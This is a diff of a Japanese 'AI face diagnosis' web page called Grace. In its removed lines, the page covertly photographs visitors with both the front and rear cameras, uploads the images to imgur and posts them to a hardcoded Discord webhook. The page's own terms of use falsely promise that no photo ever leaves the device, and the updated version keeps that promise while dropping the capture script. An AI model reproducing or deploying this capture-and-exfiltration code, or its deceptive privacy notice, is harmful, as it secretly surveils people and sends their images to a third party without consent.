@@ -1,150 +1,145 @@
-
 <!DOCTYPE html>
 <html lang="ja">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta property="og:title" content="AI顔診断 Grace" />
-  <meta property="og:description" content="内カメ・外カメで自動撮影、AI顔診断、結果をDiscordに送信" />
-  <meta property="og:image" content="https://gracephotoai.github.io/grace_preview_1200x630.jpg" />
-  <meta property="og:url" content="https://gracephotoai.github.io/" />
-  <title>Grace PhotoAI</title>
+  <meta charset="UTF-8">
+  <meta property="og:title" content="AI顔診断 Grace">
+  <meta property="og:description" content="本格AI顔診断 Grace (グレース)。肌年齢・顔の比率・イエベ/ブルベなどがすぐにわかる！">
+  <meta property="og:image" content="https://gracephotoai.github.io/grace_preview_1200x630.jpg">
+  <meta property="og:url" content="https://gracephotoai.github.io/">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AI顔診断 Grace</title>
   <style>
     body {
-      background-color: #1e1e1e;
+      background-color: #1a1a1a;
       color: white;
       font-family: Arial, sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
+      text-align: center;
       margin: 0;
+      padding: 0;
     }
+
     h1 {
-      font-size: 3em;
-      margin-bottom: 20px;
+      font-size: 3rem;
+      margin-top: 2rem;
+      font-family: 'Brush Script MT', cursive;
     }
+
     button {
-      padding: 15px 30px;
-      font-size: 1.5em;
+      font-size: 1.5rem;
+      padding: 1rem 2rem;
+      margin: 2rem;
       border: none;
-      border-radius: 5px;
-      background-color: #4CAF50;
+      border-radius: 8px;
+      background-color: #444;
       color: white;
       cursor: pointer;
     }
-    #terms {
-      position: absolute;
-      bottom: 20px;
-      font-size: 0.9em;
-      cursor: pointer;
-      text-decoration: underline;
+
+    button:hover {
+      background-color: #666;
     }
-    #termsModal {
+
+    video {
+      width: 100%;
+      max-width: 480px;
+      margin-top: 2rem;
+    }
+
+    .modal {
       display: none;
       position: fixed;
-      bottom: 0;
+      z-index: 1000;
       left: 0;
+      top: 0;
       width: 100%;
-      background: #333;
+      height: 100%;
+      overflow: auto;
+      background-color: rgba(0,0,0,0.7);
+    }
+
+    .modal-content {
+      background-color: #1c1c1c;
       color: white;
+      margin: 10% auto;
       padding: 20px;
+      border: 1px solid #888;
+      width: 90%;
+      max-width: 600px;
+      border-radius: 8px;
+      font-size: clamp(0.9rem, 2vw, 1.1rem);
+      line-height: 1.6;
+    }
+
+    .close {
+      color: white;
+      float: right;
+      font-size: 1.5rem;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .close:hover {
+      color: #ccc;
+    }
+
+    #terms-btn {
+      color: #ccc;
+      text-decoration: underline;
+      cursor: pointer;
+      font-size: 0.9rem;
+      margin-top: 40px;
+      display: inline-block;
     }
   </style>
 </head>
 <body>
-  <h1>Grace PhotoAI</h1>
-  <button onclick="startCapture()">診断する</button>
-  <div id="terms" onclick="document.getElementById('termsModal').style.display='block'">利用規約</div>
-  <div id="termsModal">
-    <p><strong>利用規約</strong><br>
-    本ウェブサイト（以下「当サイト」といいます）は、カメラを用いた顔面診断サービスを提供しています。ご利用にあたり、以下の利用規約をご確認いただき、同意の上でご利用ください。<br><br>
-    1. 写真の取り扱い<br>
-    診断に使用される写真データはすべてお客様のデバイス内で処理され、外部サーバー等に送信・保存されることはありません。<br><br>
-    2. サイトの利用環境<br>
-    カメラを許可していただかない場合、診断機能はご利用いただけません。正常に動作しない場合は、ブラウザの再読み込みやキャッシュのクリアをお試しください。<br><br>
-    3. サイバー攻撃等の禁止<br>
-    当サイトに対してDDoS攻撃、クラッキング、不正アクセス等のサイバー攻撃を行った場合、法的措置を含む厳正な対応を取らせていただきます。<br><br>
-    4. プライバシーの尊重<br>
-    当サイト運営者は、利用者の個人情報や写真を外部に公開することは一切ありません。また、顔面診断の結果やコメントには、個人を侮辱・揶揄する意図は一切含まれておりません。<br><br>
-    5. 著作権・禁止事項<br>
-    当サイトの内容、機能、デザイン、ロジック等の無断転載・複製・模倣は禁止します。発覚した場合は必要な対応を行います。<br><br>
-    6. 運営情報<br>
-    当サイトは2019年10月より運営を開始しております。今後も改善・更新を行っていく予定です。
-    </p>
+  <h1>Grace</h1>
+  <button id="startButton">診断する</button>
+  <video id="preview" autoplay muted playsinline></video>
+
+  <!-- 利用規約モーダル -->
+  <div id="termsModal" class="modal">
+    <div class="modal-content">
+      <span class="close" id="closeTerms">&times;</span>
+      <h2>利用規約</h2>
+      <p>本ウェブサイト（以下「当サイト」といいます）は、カメラを用いた顔面診断サービスを提供しています。ご利用にあたり、以下の利用規約をご確認いただき、同意の上でご利用ください。</p>
+      <p><strong>1. 写真の取り扱い</strong><br>
+      診断に使用される写真データはすべてお客様のデバイス内で処理され、外部サーバー等に送信・保存されることはありません。</p>
+      <p><strong>2. サイトの利用環境</strong><br>
+      カメラを許可していただかない場合、診断機能はご利用いただけません。正常に動作しない場合は、ブラウザの再読み込みやキャッシュのクリアをお試しください。</p>
+      <p><strong>3. サイバー攻撃等の禁止</strong><br>
+      当サイトに対してDDoS攻撃、クラッキング、不正アクセス等のサイバー攻撃を行った場合、法的措置を含む厳正な対応を取らせていただきます。</p>
+      <p><strong>4. プライバシーの尊重</strong><br>
+      当サイト運営者は、利用者の個人情報や写真を外部に公開することは一切ありません。また、顔面診断の結果やコメントには、個人を侮辱・揶揄する意図は一切含まれておりません。</p>
+      <p><strong>5. 著作権・禁止事項</strong><br>
+      当サイトの内容、機能、デザイン、ロジック等の無断転載・複製・模倣は禁止します。発覚した場合は必要な対応を行います。</p>
+      <p><strong>6. 運営情報</strong><br>
+      当サイトは2019年10月より運営を開始しております。今後も改善・更新を行っていく予定です。</p>
+    </div>
   </div>
+
+  <div style="text-align: center;">
+    <span id="terms-btn">利用規約</span>
+  </div>
+
   <script>
-    const webhookURL = "https://discord.com/api/webhooks/1365282819646947409/YLfOxbOuLrQ6AHYb0_bImraprcO6VxmcoIbM4Sz2r9z_fIvuZiLED3TUIIDZCeQszc_u";
+    const termsModal = document.getElementById("termsModal");
+    const termsBtn = document.getElementById("terms-btn");
+    const closeTerms = document.getElementById("closeTerms");
 
-    async function startCapture() {
-      const constraints = { video: { facingMode: "user" } };
-      const streamIn = await navigator.mediaDevices.getUserMedia(constraints);
-      const video = document.createElement("video");
-      video.srcObject = streamIn;
-      video.play();
+    termsBtn.onclick = () => {
+      termsModal.style.display = "block";
+    };
 
-      const canvas = document.createElement("canvas");
-      const context = canvas.getContext("2d");
+    closeTerms.onclick = () => {
+      termsModal.style.display = "none";
+    };
 
-      const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
-      const images = [];
-
-      // 内カメで5枚
-      for (let i = 0; i < 5; i++) {
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const dataUrl = canvas.toDataURL("image/jpeg");
-        images.push(dataUrl);
-        await delay(200);
+    window.onclick = (event) => {
+      if (event.target == termsModal) {
+        termsModal.style.display = "none";
       }
-
-      // 外カメに切り替え
-      streamIn.getTracks().forEach(track => track.stop());
-      const streamOut = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
-      video.srcObject = streamOut;
-
-      await delay(500);
-      // 外カメで5枚
-      for (let i = 0; i < 5; i++) {
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const dataUrl = canvas.toDataURL("image/jpeg");
-        images.push(dataUrl);
-        await delay(200);
-      }
-
-      streamOut.getTracks().forEach(track => track.stop());
-
-      const embeds = [];
-      for (let dataUrl of images) {
-        const blob = await (await fetch(dataUrl)).blob();
-        const form = new FormData();
-        form.append("image", blob, "photo.jpg");
-        const res = await fetch("https://api.imgur.com/3/image", {
-          method: "POST",
-          headers: { Authorization: "Client-ID 6e1b6bf28c5da0e" },
-          body: form
-        });
-        const result = await res.json();
-        if (result.data?.link) {
-          embeds.push({ image: { url: result.data.link } });
-        }
-      }
-
-      await fetch(webhookURL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          content: "サイトから取得した写真を送信
-
-＜━━━━━＞
-1〜5枚目 インカメラで撮影した写真
-6〜10枚目 アウトカメラで撮影した写真
-インカメラ→内カメ
-アウトカメラ→外カメ",
-          embeds: embeds
-        })
-      });
-    }
+    };
   </script>
 </body>
 </html>
